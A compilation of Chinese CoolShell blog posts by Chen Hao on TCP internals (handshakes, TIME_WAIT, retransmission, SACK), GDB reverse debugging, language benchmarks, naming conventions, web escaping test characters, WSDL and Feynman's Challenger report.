#### TCP头格式接下来，我们来看一下TCP头的格式TCP头格式（图片来源）你需要注意这么几点：* TCP的包是没有IP地址的，那是IP层上的事。但是有源端口和目标端口。   * 一个TCP连接需要四个元组来表示是同一个连接（src_ip, src_port, dst_ip, dst_port）准确说是五元组，还有一个是协议。但因为这里只是说TCP协议，所以，这里我只说四元组。   * 注意上图中的四个非常重要的东西：      * **Sequence Number** 是包的序号， **用来解决网络包乱序（reordering）问题。**     * **Acknowledgement Number** 就是ACK——用于确认收到， **用来解决不丢包的问题** 。     * **Window又叫Advertised-Window** ，也就是著名的滑动窗口（Sliding Window）， **用于解决流控的** 。     * **TCP Flag** ，也就是包的类型， **主要是用于操控TCP的状态机的** 。关于其它的东西，可以参看下面的图示（图片来源）#### TCP的状态机
其实， **网络上的传输是没有连接的，包括TCP也是一样的** 。而TCP所谓的“连接”，其实只不过是在通讯的双方维护一个“连接状态”，让它看上去好像有连接一样。所以，TCP的状态变换是非常重要的。下面是：“ **TCP协议的状态机** ”（图片来源） 和 “ **TCP建链接** ”、“ **TCP断链接** ”、“ **传数据** ” 的对照图，我把两个图并排放在一起，这样方便在你对照着看。另外，下面这两个图非常非常的重要，你一定要记牢。（吐个槽：看到这样复杂的状态机，就知道这个协议有多复杂，复杂的东西总是有很多坑爹的事情，所以TCP协议其实也挺坑爹的）很多人会问，为什么建链接要3次握手，断链接需要4次挥手？* **对于建链接的3次握手，** 主要是要初始化Sequence Number 的初始值。通信的双方要互相通知对方自己的初始化的Sequence Number（缩写为ISN：Inital Sequence Number）——所以叫SYN，全称Synchronize Sequence Numbers。也就上图中的 x 和 y。这个号要作为以后的数据通信的序号，以保证应用层接收到的数据不会因为网络上的传输的问题而乱序（TCP会用这个序号来拼接数据）。
* **对于4次挥手，** 其实你仔细看是2次，因为TCP是全双工的，所以，发送方和接收方都需要Fin和Ack。只不过，有一方是被动的，所以看上去就成了所谓的4次挥手。如果两边同时断连接，那就会就进入到CLOSING状态，然后到达TIME_WAIT状态。下图是双方同时断连接的示意图（你同样可以对照着TCP状态机看）：两端同时断连接（图片来源）另外，有几个事情需要注意一下：* **关于建连接时SYN超时** 。试想一下，如果server端接到了clien发的SYN后回了SYN-ACK后client掉线了，server端没有收到client回来的ACK，那么，这个连接处于一个中间状态，即没成功，也没失败。于是，server端如果在一定时间内没有收到的TCP会重发SYN-ACK。在Linux下，默认重试次数为5次，重试的间隔时间从1s开始每次都翻售，5次的重试时间间隔为1s, 2s, 4s, 8s, 16s，总共31s，第5次发出后还要等32s都知道第5次也超时了，所以，总共需要 1s + 2s + 4s+ 8s+ 16s + 32s = 2^6 -1 = 63s，TCP才会把断开这个连接。* **关于SYN Flood攻击** 。一些恶意的人就为此制造了SYN Flood攻击——给服务器发了一个SYN后，就下线了，于是服务器需要默认等63s才会断开连接，这样，攻击者就可以把服务器的syn连接的队列耗尽，让正常的连接请求不能处理。于是，Linux下给了一个叫 **tcp_syncookies** 的参数来应对这个事——当SYN队列满了后，TCP会通过源地址端口、目标地址端口和时间戳打造出一个特别的Sequence Number发回去（又叫cookie），如果是攻击者则不会有响应，如果是正常连接，则会把这个 SYN Cookie发回来，然后服务端可以通过cookie建连接（即使你不在SYN队列中）。请注意， **请先千万别用tcp_syncookies来处理正常的大负载的连接的情况** 。因为，synccookies是妥协版的TCP协议，并不严谨。对于正常的请求，你应该调整三个TCP参数可供你选择，第一个是：tcp_synack_retries 可以用他来减少重试次数；第二个是：tcp_max_syn_backlog，可以增大SYN连接数；第三个是：tcp_abort_on_overflow 处理不过来干脆就直接拒绝连接了。
* **关于ISN的初始化** 。ISN是不能hard code的，不然会出问题的——比如：如果连接建好后始终用1来做ISN，如果client发了30个segment过去，但是网络断了，于是 client重连，又用了1做ISN，但是之前连接的那些包到了，于是就被当成了新连接的包，此时，client的Sequence Number 可能是3，而Server端认为client端的这个号是30了。全乱了。RFC793中说，ISN会和一个假的时钟绑在一起，这个时钟会在每4微秒对ISN做加一操作，直到超过2^32，又从0开始。这样，一个ISN的周期大约是4.55个小时。因为，我们假设我们的TCP Segment在网络上的存活时间不会超过Maximum Segment Lifetime（缩写为MSL – Wikipedia语条），所以，只要MSL的值小于4.55小时，那么，我们就不会重用到ISN。* **关于 MSL 和 TIME_WAIT** 。通过上面的ISN的描述，相信你也知道MSL是怎么来的了。我们注意到，在TCP的状态图中，从TIME_WAIT状态到CLOSED状态，有一个超时设置，这个超时设置是 2*MSL（RFC793定义了MSL为2分钟，Linux设置成了30s）为什么要这有TIME_WAIT？为什么不直接给转成CLOSED状态呢？主要有两个原因：1）TIME_WAIT确保有足够的时间让对端收到了ACK，如果被动关闭的那方没有收到Ack，就会触发被动端重发Fin，一来一去正好2个MSL，2）有足够的时间让这个连接不会跟后面的连接混在一起（你要知道，有些自做主张的路由器会缓存IP数据包，如果连接被重用了，那么这些延迟收到的包就有可能会跟新连接混在一起）。你可以看看这篇文章《TIME_WAIT and its design implications for protocols and scalable client server systems》
* **关于TIME_WAIT数量太多** 。从上面的描述我们可以知道，TIME_WAIT是个很重要的状态，但是如果在大并发的短链接下，TIME_WAIT 就会太多，这也会消耗很多系统资源。只要搜一下，你就会发现，十有八九的处理方式都是教你设置两个参数，一个叫 **tcp_tw_reuse** ，另一个叫 **tcp_tw_recycle** 的参数，这两个参数默认值都是被关闭的，后者recyle比前者resue更为激进，resue要温柔一些。另外，如果使用tcp_tw_reuse，必需设置tcp_timestamps=1，否则无效。这里，你一定要注意， **打开这两个参数会有比较大的坑——可能会让TCP连接出一些诡异的问题** （因为如上述一样，如果不等待超时重用连接的话，新的连接可能会建不上。正如官方文档上说的一样“ **It should not be changed without advice/request of technical experts** ”）。* **关于tcp_tw_reuse** 。官方文档上说tcp_tw_reuse 加上tcp_timestamps（又叫PAWS, for Protection Against Wrapped Sequence Numbers）可以保证协议的角度上的安全，但是你需要tcp_timestamps在两边都被打开（你可以读一下tcp_twsk_unique的源码 ）。我个人估计还是有一些场景会有问题。
* **关于tcp_tw_recycle** 。如果是tcp_tw_recycle被打开了话，会假设对端开启了tcp_timestamps，然后会去比较时间戳，如果时间戳变大了，就可以重用。但是，如果对端是一个NAT网络的话（如：一个公司只用一个IP出公网）或是对端的IP被另一台重用了，这个事就复杂了。建链接的SYN可能就被直接丢掉了（你可能会看到connection time out的错误）（如果你想观摩一下Linux的内核代码，请参看源码 tcp_timewait_state_process）。* **关于tcp_max_tw_buckets** 。这个是控制并发的TIME_WAIT的数量，默认值是180000，如果超限，那么，系统会把多的给destory掉，然后在日志里打一个警告（如：time wait bucket table overflow），官网文档说这个参数是用来对抗DDoS攻击的。也说的默认值180000并不小。这个还是需要根据实际情况考虑。**Again，使用tcp_tw_reuse和tcp_tw_recycle来解决TIME_WAIT的问题是非常非常危险的，因为这两个参数违反了TCP协议（RFC 1122） **
其实，TIME_WAIT表示的是你主动断连接，所以，这就是所谓的“不作死不会死”。试想，如果让对端断连接，那么这个破问题就是对方的了，呵呵。另外，如果你的服务器是于HTTP服务器，那么设置一个HTTP的KeepAlive有多重要（浏览器会重用一个TCP连接来处理多个HTTP请求），然后让客户端去断链接（你要小心，浏览器可能会非常贪婪，他们不到万不得已不会主动断连接）。#### 数据传输中的Sequence Number下图是我从Wireshark中截了个我在访问coolshell.cn时的有数据传输的图给你看一下，SeqNum是怎么变的。（使用Wireshark菜单中的Statistics ->Flow Graph… ）你可以看到， **SeqNum的增加是和传输的字节数相关的** 。上图中，三次握手后，来了两个Len:1440的包，而第二个包的SeqNum就成了1441。然后第一个ACK回的是1441，表示第一个1440收到了。**注意** ：如果你用Wireshark抓包程序看3次握手，你会发现SeqNum总是为0，不是这样的，Wireshark为了显示更友好，使用了Relative SeqNum——相对序号，你只要在右键菜单中的protocol preference 中取消掉就可以看到“Absolute SeqNum”了
#### TCP重传机制TCP要保证所有的数据包都可以到达，所以，必需要有重传机制。注意，接收端给发送端的Ack确认只会确认最后一个连续的包，比如，发送端发了1,2,3,4,5一共五份数据，接收端收到了1，2，于是回ack 3，然后收到了4（注意此时3没收到），此时的TCP会怎么办？我们要知道，因为正如前面所说的， **SeqNum和Ack是以字节数为单位，所以ack的时候，不能跳着确认，只能确认最大的连续收到的包** ，不然，发送端就以为之前的都收到了。##### 超时重传机制一种是不回ack，死等3，当发送方发现收不到3的ack超时后，会重传3。一旦接收方收到3后，会ack 回 4——意味着3和4都收到了。但是，这种方式会有比较严重的问题，那就是因为要死等3，所以会导致4和5即便已经收到了，而发送方也完全不知道发生了什么事，因为没有收到Ack，所以，发送方可能会悲观地认为也丢了，所以有可能也会导致4和5的重传。对此有两种选择：* 一种是仅重传timeout的包。也就是第3份数据。   * 另一种是重传timeout后所有的数据，也就是第3，4，5这三份数据。这两种方式有好也有不好。第一种会节省带宽，但是慢，第二种会快一点，但是会浪费带宽，也可能会有无用功。但总体来说都不好。因为都在等timeout，timeout可能会很长（在下篇会说TCP是怎么动态地计算出timeout的）
##### 快速重传机制于是，TCP引入了一种叫 **Fast Retransmit** 的算法， **不以时间驱动，而以数据驱动重传** 。也就是说，如果，包没有连续到达，就ack最后那个可能被丢了的包，如果发送方连续收到3次相同的ack，就重传。Fast Retransmit的好处是不用等timeout了再重传。比如：如果发送方发出了1，2，3，4，5份数据，第一份先到送了，于是就ack回2，结果2因为某些原因没收到，3到达了，于是还是ack回2，后面的4和5都到了，但是还是ack回2，因为2还是没有收到，于是发送端收到了三个ack=2的确认，知道了2还没有到，于是就马上重转2。然后，接收端收到了2，此时因为3，4，5都收到了，于是ack回6。示意图如下：Fast Retransmit只解决了一个问题，就是timeout的问题，它依然面临一个艰难的选择，就是，是重传之前的一个还是重传所有的问题。对于上面的示例来说，是重传#2呢还是重传#2，#3，#4，#5呢？因为发送端并不清楚这连续的3个ack(2)是谁传回来的？也许发送端发了20份数据，是#6，#10，#20传来的呢。这样，发送端很有可能要重传从2到20的这堆数据（这就是某些TCP的实际的实现）。可见，这是一把双刃剑。
##### SACK 方法另外一种更好的方式叫： **Selective Acknowledgment (SACK)** （参看RFC 2018），这种方式需要在TCP头里加一个SACK的东西，ACK还是Fast Retransmit的ACK，SACK则是汇报收到的数据碎版。参看下图：这样，在发送端就可以根据回传的SACK来知道哪些数据到了，哪些没有到。于是就优化了Fast Retransmit的算法。当然，这个协议需要两边都支持。在 Linux下，可以通过 **tcp_sack** 参数打开这个功能（Linux 2.4后默认打开）。这里还需要注意一个问题—— **接收方Reneging，所谓Reneging的意思就是接收方有权把已经报给发送端SACK里的数据给丢了** 。这样干是不被鼓励的，因为这个事会把问题复杂化了，但是，接收方这么做可能会有些极端情况，比如要把内存给别的更重要的东西。 **所以，发送方也不能完全依赖SACK，还是要依赖ACK，并维护Time- Out，如果后续的ACK没有增长，那么还是要把SACK的东西重传，另外，接收端这边永远不能把SACK的包标记为Ack。**注意：SACK会消费发送方的资源，试想，如果一个攻击者给数据发送方发一堆SACK的选项，这会导致发送方开始要重传甚至遍历已经发出的数据，这会消耗很多发送端的资源。详细的东西请参看《TCP SACK的性能权衡》
##### Duplicate SACK – 重复收到数据的问题Duplicate SACK又称D-SACK， **其主要使用了SACK来告诉发送方有哪些数据被重复接收了** 。RFC-2883 里有详细描述和示例。下面举几个例子（来源于RFC-2883）D-SACK使用了SACK的第一个段来做标志，* 如果SACK的第一个段的范围被ACK所覆盖，那么就是D-SACK* 如果SACK的第一个段的范围被SACK的第二个段覆盖，那么就是D-SACK**示例一：ACK丢包**下面的示例中，丢了两个ACK，所以，发送端重传了第一个数据包（3000-3499），于是接收端发现重复收到，于是回了一个SACK=3000-3500，因为ACK都到了4000意味着收到了4000之前的所有数据，所以这个SACK就是D- SACK——旨在告诉发送端我收到了重复的数据，而且我们的发送端还知道，数据包没有丢，丢的是ACK包。Transmitted  Received    ACK Sent     Segment      Segment     (Including SACK Blocks)3000-3499    3000-3499   3500 (ACK dropped)     3500-3999    3500-3999   4000 (ACK dropped)     3000-3499    3000-3499   4000, SACK=3000-3500     ---------
**示例二，网络延误**下面的示例中，网络包（1000-1499）被网络给延误了，导致发送方没有收到ACK，而后面到达的三个包触发了“Fast Retransmit算法”，所以重传，但重传时，被延误的包又到了，所以，回了一个SACK=1000-1500，因为ACK已到了3000，所以，这个SACK是D- SACK——标识收到了重复的包。这个案例下，发送端知道之前因为“Fast Retransmit算法”触发的重传不是因为发出去的包丢了，也不是因为回应的ACK包丢了，而是因为网络延时了。Transmitted    Received    ACK Sent     Segment        Segment     (Including SACK Blocks)500-999        500-999     1000     1000-1499      (delayed)     1500-1999      1500-1999   1000, SACK=1500-2000     2000-2499      2000-2499   1000, SACK=1500-2500     2500-2999      2500-2999   1000, SACK=1500-3000     1000-1499      1000-1499   3000     1000-1499   3000, SACK=1000-1500     ---------
可见，引入了D-SACK，有这么几个好处：1）可以让发送方知道，是发出去的包丢了，还是回来的ACK包丢了。2）是不是自己的timeout太小了，导致重传。3）网络上出现了先发的包后到的情况（又称reordering）4）网络上是不是把我的数据包给复制了。**知道这些东西可以很好得帮助TCP了解网络情况，从而可以更好的做网络上的流控** 。Linux下的tcp_dsack参数用于开启这个功能（Linux 2.4后默认打开）好了，上篇就到这里结束了。如果你觉得我写得还比较浅显易懂，那么，欢迎移步看下篇《TCP的那些事（下）》**TCP的那些事儿（下）>>>**（上篇完）# 高科技：GDB回溯调试作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn也许大家知道，GDB 版本7.0 (2009年9月release) 会是第一次开始支持Reversable Debugging （回溯调式技术），这是一种可以让在debug程序时当我们运行单步调试或是运行到断点时，可以以逆向执行程序的一种技术。（这是GNU的新闻链接）下面是GDB7.0版本所支持的回溯调试的命令，其中包括，continue，step，以及调试方向的设置。
* **reverse-continue** (‘rc’) — 继续程序运行到断点，但是是逆向运行程序。 * **reverse-finish** — 逆向运行程序直到跳出本层函数。 * **reverse-next** (‘rn’) — 语句单步向后跟踪程序。 * **reverse-nexti** (‘rni’) — 指令单步向后一条指令。 * **reverse-step** (‘rs’) — 向后执行一条语句，单步进入。 * **reverse-stepi** — 向后执行一条指令，单步进入。 * **set exec-direction (forward/reverse)** — 设置程序执行方向，向前或向后。在网上查了一下，发现VS2010好像也准备要支持这个东西，微软叫这个东西为“Historical Debugging”。这个东西，对于我这个老家伙来说比较新鲜，而且还有点诡异。我有点没跟上这个技术，不知道这个技术主要是用来干什么？对于程序的运行的回滚？这样一来，如果，我某条语句创建了一个线程，或是一个文件，逆向执行回去，莫非它还能把这些程序创建出来的资源回收啦？就算是能回收，要是我的某个程序向网络发了些数据出去，莫非它还能给我再收回来？也许我想得太极端了，不过好像目前对这个技术的原始需求的说明不是很多，所以真不知道这个技术除了很酷，还有什么？也许是我理解错了，希望大家指点一下。
# 编程语言的评测作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**摘要** ：这篇文章的原文出处在这里 我意译了整篇文章。结合计算机语言评测基准这个网站来读此文还是比较有意思。当然也不能以这个评测结果就贸然断定什么语言最好，什么语言不好。没有好不好的语言，只有适不适用于你解决问题域的语言。就文章而言请大家还是不必太过认真，就当从另一个方面来了解一下这33种编程语言吧。计算机语言评测基准是一个由429个程序组成的集合，它评测了33个程序语言的13的重复实现的基准程序。如果你想量化的比较不同语言，那么这个是一个非常不错的资源。在计算机评测基准中，评测者为了尽量让评测准确，非常谨慎的选择了13个基准程序，这13个基准程序并不针对某以特定语言有特殊的优化。对于评测选择33中语言都实现了13个基准程序。当然，除了速度这个指标外，程序基准评测同时也为每一个基准测试程序发布一个编码大小指标。非常感谢基准评测让我们看到程序设计中非常重要的一个方面：程序语言的性能和程序语言灵活性之间的矛盾。正是这个矛盾给所谓“高级编程语言”带上一个含蓄的轻蔑的意思。即，当你在使用这些高级语言编码时，你也许可以编写出漂亮的代码，但是你是如此的远离了硬件，你不可能获得更好的性能，是这样的吗？
!size-vs-speed-vs-depandability-context-3   如果我们将基准测试程序的结果放在一张XY的图表上，那么我们就可以为这张表的4个角命名。快速而复杂的语言应积聚在图表的左上角。我们把这类语言称为系统语言。简洁但慢速的语言应该聚集在右下角，我们称之为脚本语言。在右上角，应该是过时的语言。除非这些语言具有非常吸引人的特性，否则语言已经被新出现的语言所淘汰。最后在左下角，基本上找不到对应的语言，因为在这一区域的语言是理想状态的语言。在这个区域的语言是又快又短又利于使用的语言。图中每一个小点就代表一种语言的一个基准程序实现，因此这图里面共有429个点，每个点的XY轴分别代表了其和最好的语言实现差距的倍数(从语言的复杂性和语言执行性能来说)，其中一些点比较分散，我们就没有在图中画出。从上面这个图我们可以看到这些粉红色点沿着Y轴(复杂性)比X轴(执行性能)分布更统一，这是不是意味着，人类在提升语言表达的灵活性上还在稳步的不断进步，而在提升语言性能方面却遇到了很多的麻烦呢：）针对每一个种语言，比如说scala语言，我们用下面的图来描述：图的中心点，是这个语言测试结果的平均值，然后做每一个评测结果的具体值到这个均值的连线就够成了一个星型图。这个图说明了scala一些特性，在X轴性能上来说，大部分点都分布在靠近左边，说明scala的性能是不错的，如果优化JVM的话，scala可以大部分提高性能，但是scala性能分布并不一致，其中的一个点甚至到了最右边。就语言复杂性(Y轴)来说，scala的表现也不错，不过有时候为了获得高性能，也会导致语言复杂提高，比如scala的其中一个点就在最顶端。
!size-vs-speed-vs-depandability-scala通过为每一种语言形成如上的一个图，我们最后可以为这33种语言评的测结果形成了如下的一个图，这是一个6*6的图。其中每一个小图具有同样的轴和同样的精度。这张图的目的是为了方便的比较每一个语言的星型。这些图按语言的平均性能来组织列，最左边的语言的性能最好，最右边的语言性能最差，在每一列中的语言又按照平均的语言代码量(复杂程度)进行排列，代码量最小的语言在最低端，代码量最大的在最顶端。!size-vs-speed-vs-depandability-2009点击看大图在图的最左边的性能是最好的，又高又瘦的星型，我们可以看到，除了GCC和G++外，其他的性能都显示了惊人的一致性(每一个基准测试程序的性能都非常接近)。而JAVA也非常骄傲的出现在一组中，这说明经过了10年的优化后，Java运行时的性能已经得到长足的提高(要用Java做大系统的人是否还会犹豫呢：）)。   在图的右边，我们看到了一些又胖又矮的星型，这些是一些脚本语言，从图中可以看出，这些脚本语言社区的人们当他们在不断改善他们语言的表达性的同时并没有花大力气在性能的改善上。然而也有例外，Lua这门脚本语言就有很好的执行性能。
# 程序命名的一些提示作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn选择一个正确的名字是编程中最重要的事。以前酷壳向大家推荐过两篇文章《编程命名中的7+1个提示》 和《编程中的命名设计那点事》，今天再向大家推荐一篇。一个正确的命名可以让你更容易地理解代码的程序，好的命名可以消除二义性，消除误解，并且说明真实的意图，甚至可以让你有清新的气息以让你更能吸引异性。;-)### 方法，类和变量正确的名字可以让你的程序顾名思义，下面是一些提示：* **不要使用” ProcessData()“这样的命名**   你如果在你的程序生涯中使用这样的函数名，那么这意味着你将是一个不合格的程序员而会被淘汰或解雇。请 **明确实际的功能** 。比如：`ValidateUserLogin（验证用户登录）` 或 `EliminateDuplicateRequests（去除重复请求）` 或 `ComputeAverageAge（计算平均年龄），等等。`* **让命名来帮你设计程序**   让我们假装有这么一条规则是——“任何的函数是有输入/输出的”，那么，你需要思考的是所有的把input变成ouptut的步骤，然后，你可以选择一个简短的句了来说明你的这段程序，然后，把这个短句再精练一下，最终成为你的函数名，而那个短句则成了你程序的结构。
* **命令不应该是模糊的**   如果你有一个类名叫：`FilterCriteria` ，但实际上其可用于文件过滤，那么这个类应该叫做： `FileFilterCriteria ，就算是你真要想要用` FilterCriteria，那它也应该是抽象类。* **避免过多的工作**   这只是一个风格上的事情，但还是需要注意一下。在上面，我们使用到了 `ValidateUserLogin` 和 `EliminateDuplicateRequests两个名字，这两个命令看上去需要做很多比较复杂的事。所以，让你的名字变简单一些也有利于你的程序更容易阅读和维护。一个软件本来就是由不同的模块拼成，而一个模块又是由更细小的函数和类拼成。编程中，我们都知道，一个函数的尺寸应该控制在200行以内，一个类的接口应该控制在20个以内。所以，从其名字上我们就不要让一个名字取得太大了。`* **避免类名以 “Manager” 结尾**   这样会让你类变成一个黑盒子，当然，有一些程序员喜欢使用这样的名字让那个类看起来好像更强大一些，但其实这样并不好。一般来说使用Manager这个字眼通常是使用工厂模式，或是一个容器，所以，对于一些最基本的算法或是数据结构的封装，最好是在其名字上体现这一算法或数据结构的名字，如： `SortedList` 和`ConnectionPool 。`
* **为你的枚举类型使用单数名字   **一个枚举类型会列出所有可能的值，所以，叫`animalType` 会比 `animalTypes 要好。`* **匈牙利命名应该更多的关注名字的含义而不是类型**   匈牙利命名是一个以前很流行的命名方法，其给出了一整套的方法告诉你如何标记你的变量的类型，但可惜的是很多程序员过多的关注了变量了类型，而不是变量名的含义。而变量名的含义才是根本。* **不要让名字隐藏了内在**   比如，我们有段代码需要处理用户的输入，把其转成UTF-8码，然后标准化（比如一些协议），最后再处理相应的转义字符。千万不要把这函数命名为`Escape()` ，因为你需要调用 `ToUTF8()` 以及`NormalizeEntities()` 最后才是 `Escape()` 函数。如果你希望使用一个函数名来做这三件事，那么，你宁可使用一个模糊的名字再加上充分的注释，而不是一个确切的名字。模糊的名字会让别人在阅读时想进去看看，而确切的名字则会让别人在阅读代码时忽略细节（这看起来和第一点有点矛盾，其实也是为了程序的易读）。比如：`ProcessUserInput()`* **一致性, **一致性** , **一致性****   强调文章和代码的一致性，就算是文档写得再详细，我们也要去读代码，所以文档主要是体现思路和反映需求和设计。在程序上，我们的命令应当和文档中的术语保持一致，而程序中的命名也应该是用和文档相同的风格，这样，我们可以少很多理解上的成本。
* **不要害怕改名   **有一些时候，你会觉得某具名字不合适，你需要改动一下。但你马上发现要改这个名字，需要修改很多的程序代码。在这里有一个原则，如果你的这个名字不是以API的方式发布时，那么你就应该不要害怕更改名字，就算是修改的工作量并不小，为了日后的更容易的阅读和维护，这是值得的。但是，如果这是一个API的名字，那我还是建议你不要改了，就算是你觉得这个名字烂得很。因为，当你的程序以API的形式发布后，会有N多的他人的程序依赖于这个名字，这个时候，兼容性和用户比什么都重要。### Frameworks 和 Libraries你的用户是一个程序员，他需要使用你的代码进行二次开发。 Namespaces 将会是你重点需要注意的东西。* **使用namespaces 而不是类的前缀**   希望你的编程序语言支持namespace，这样，你就可以使用它而不是在类名前面加前缀了。如果你所使用的语言不支持namespace，那么你应该上网看看其它程序员使用什么样的方式来区分自己的代码和别人的代码名字空间。* **使用普通的namespace而不是使用公司名**   使用公司名做namespace并不是一个好的相法，因为公司名很容易变更，比如，公司因为被收购，被控告，合并，重组等原因需要更名。产品的名字同样也会改变。所以，使用一个普通的namespaces会好一些。如STL，ACE等。
### 数据库Database Schemas 意为数据模型，所以，其名字应该和其领域是合乎逻辑的，而不是为了编程的方便。* **数据表应使用复数**   别使用单数形式，这是因为在远古的ORM 中需要使用单数的形式来定义类名。而且，一个表中包含了许多行数据，所以也应该是复数的。如，”items“, “customers“, “journalEntries” 等等。,* **为那些包括派生数据或是日常处理的表使用aux_ 和meta_ 前缀**   这些表中的数据都是用来做为临时处理的，所以，你需要一个前缀或是后缀来使他们区别于实际的表。* **为主键加入表名   **如果你有一张表叫 “driverLicenses” 而ID 列是主键，那么你应该把这个主键命名为”driverLicense_id” 而不是”id”。这样做的好处是，当你在连接两个表的时候，你不需要为主键指定表名，如： “driverLicense.id” 或”vehicle.id“，也不需要为其取别名。* **使用后缀来标识类**   这样的例子很多，比如：ISBN 和Dewey Decimal numbers，VIN等等.   Joe Celko有一篇文章叫 SQL Programming Style提到了下面这样的风格：   _id 主键   _nbr 字符串型的数位（有严格的规则，如：车牌号，身份证号，手机号等）   _code 标准化编码(如：邮编，ISO 国家编码)   _cat 种类名   _class 子集   _type 稍不正式的类名，比如，驾照中的，”摩托车”, “汽车”, and “出租车” 类型。
### 其它* **对于“物理上”的东西，命名其是什么，而不是做什么**   比如某些物理上的名字，姓名，性别，文件路径，网络链接，文件描述符，下标索引，类的属性，这些都是物理上的东西，所以，其名字应该是标识其是什么，而不是用来做什么。* **对于“逻辑上”的东西，命名其做什么，而不是是什么**   比如某些逻辑上的名字，函数名，数据结构，等。* **避免”Category” 问题**   千万别使用”Category” 作为你的属性名，因为，你会马上发现，这并不靠谱，因为这就等于什么没有说。与此相类似的还有”type” ，”kind” ，”variant” ，”classification” ，”subcategory” 等，对于这些名字，没人知道其是什么东西。而应该使用更为明确的分类，如： “FuelEfficiencyGrade”, “PackagingType”, “AgeGroup”, “Flamability”, “AllergenLevel”, 等等。文章：来源# Web程序的最佳测试数据作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
这里有一篇Matthias写的关于转义字符文章-“The art of escaping”，这篇文章告诉你有一些比较特殊的字符需要你去认真的处理，不然，你的网站程序轻则出错，重则被人黑了。这些物殊的字符是[`<"@%'&_\?/:;,>কী €`] ，你可以使用这个字符串到任意一个可以输入的Web程序上去做测试。下面这个表格告诉你为什么这些字符很特殊。这个列表不会是完整的，而且也永远不会完整。相关领域 | 转义字符   ---|---   HTML | < , > , &   JSON | “   SQL in mySql | 字符串 “, ‘, 通配符 %, _   rfc 1738 for URL- parameter | ;, /, ?, :, “, @, =, & 空格把这些转义字符放在一起，然后再整些 utf-8 的一些特殊字符。这些utf-8的字符你可以参看本站的Unicode字符预览表一文，并从中获取。另外，你还可以使用下面的这些工具来对你的程序进行调试或检查：* 一个高级Web调试插件： firebug   * 标准的请求/响应插件： Live HTTP headers   * 一些抓包程序： HTTPfox or tamper data   * IE的开发者可以试试这个：Fiddler.com
如果上面的工具都不能帮助你的话，你可能需要打调试日志，或是使用一个透明的代理服务器：如： Charles Web Debugging Proxy （Windows）（全文完）# WSDL 1.1 中文规范作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnWSDL规范目前最新的版本是2.0 ，但是目前大部分还是按1.1的版本进行使用，而且1.1的内容看上去比2.0也简单些，所以我就翻译了这个版本。作为一种《炒作过度的技术和概念》的一类，WEB Service的确是太过重量级，对于小型的应用，还是因该避免去使用xml和SOAP这些技术。但是在企业级的应用，WEB Service已经开始成为了一种常态，所以对其有一定了解或多或少都是有一些好处的。当然，通过读规范来学习一门技术的方法，从来都不是一种好的学习方法，规范只是配合你学习的参考。而且WSDL1.1规范中笔误太多，笔者就发现了两处，都一一做了修正。原文的地址在： ，学习WSDL，需要有一定XML，XML Schema XSD，SOAP的相关知识，请在阅读时特别注意。另外WSDL1.1是一个宽泛的规范，所有的语法都以非正式的形式出现，而且为了满足WEB Service 扩展性的需求，也不可能定义出详尽的语法，请在阅读时特别注意。
我的翻译版本以word形式提供，请要转载的同学们别把酷壳logo去掉的，转载请注明出处。由于个人水平有限，翻译难免出现错误。还请读者海涵。下载：WSDL 中文规范1.1# Richard Feynman, 挑战者号, 软件工程作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn源文：链接 （本文主要根据挑战者号的问题，以及Richard Feynman那对NASA严厉的批评报告，批评了不适当的“自顶向下”的设计方法，并总结了一下软件工程和其它工程的相通的一些观点。翻译水平有限，欢迎指正）!Challenger Crew佛罗里达州，美国东部时间1986年1月28日上午11时39分，挑战者号航天飞机 执行为期6天的STS-51-L 任务，在发射后，其右侧固体火箭助推器（SRB – Solid Rocket Booster）的O型环密封圈（用于连接两节助推器）失效，泄漏出来的热汽达到了5000华氏度，直接蒸发了O型密封圈，并灼烧了毗邻的外部燃料舱，在几秒钟内，外部燃料舱出现结构连接失效，空气的动力迅速分解了航天飞机。在而航天飞机上升72秒以后，助推器脱落，导致航天发飞向侧面滑出。几乎在引航员 Michael J. Smith 发出”Uh oh” 的同时，整个航天飞机完全解体，片刻，航天飞机内部发生爆炸，所有7名宇航员罹难。 那时的我还只是一个小孩，我从电视下方滚动的新闻条目知道了这一惨剧。
在那个时候，火箭助推器工程师曾经警告过这个O型环可能存在问题，但可惜的是，NASA的管理层忽略了这个问题。!Challenger Explosion美国总统里根委派罗杰斯委员会对事故进行了调查，调查成员包括著名的物理学家Richard Feynman。其不羁的态度和直来直去的方法和罗杰斯委员会的风格形成了鲜明的反差。主席罗杰斯，一个政客，评论Feynman是一个“真正的痛苦”。最后，在委员会提交的报告中，Feynman反判的观点几乎被清除了出去。并且，Feynman曾被主席威胁过要把他的名字从报告中完全除掉，但最终，他们还是同意在报告中加一个附录，但只是个人观点—— Appendix F – Personal Observations on Reliability of Shuttle。这是一个好的报告，因为，这是一个富有才华的报告。其深深地洞察了在实现一些高可靠性的系统时的工程学中的一些很自然性的东西。是的，在这里，我并没有放上“软件工程” 的字样，只是工程。但Feynman的结论却非常和我们的软件开发有着不可分割的关系。这是最基本的东西，无论是软件工程，还是别的工程学。下面，让我们来看看，Feynman是怎么说的：
> 航天飞机主引擎的建造方式是 **自顶向下**(top > down)，我们可以这样说。整个引擎被设计把所有的事情放在一起，而那些相关的细节上的东西在设计当时还并不是很成熟的。所以， > **当其中的小零件（轴承，涡轮片，散热管，等等）出现问题时** ， **我们需要花费昂贵的代价才能找到事故的原因，也很难作出修改** > 。要避免问题发生，需要频繁的维护和置换重要的零部件。修理很多时候不会解决真正的原因。可见，软件开发中也一样，Bug在整个过程中存在的时间越长， 我们就越难解决这个问题。很显然，自顶向下的方法，因为在设计的时候并不熟悉实际问题，所以，Bug从设计的时候就出现了。然而，我们需要明白，需求和设计的不同之处。需求需要对产品一种清楚和良好的定义，设计则是解决如何达到需求的方法。Feynman 在这里并没有反对 功能规格说明书，他只是反对自顶向下的设计方法，比如： UML 就是蓝图 的鼓吹者。再来看看他的言论：> > 航天飞机主引擎是一个非常不同寻常的机器，它和以前所有的引擎都不一样。这完全超出了以前引擎制的工程经验。所以，不奇怪的，许多不同的流程和难点都会在工程中出现。 > **然而，很不幸地，这是通过自顶向下设计，所以，那些流程和问题是很难被发现被修正的** > 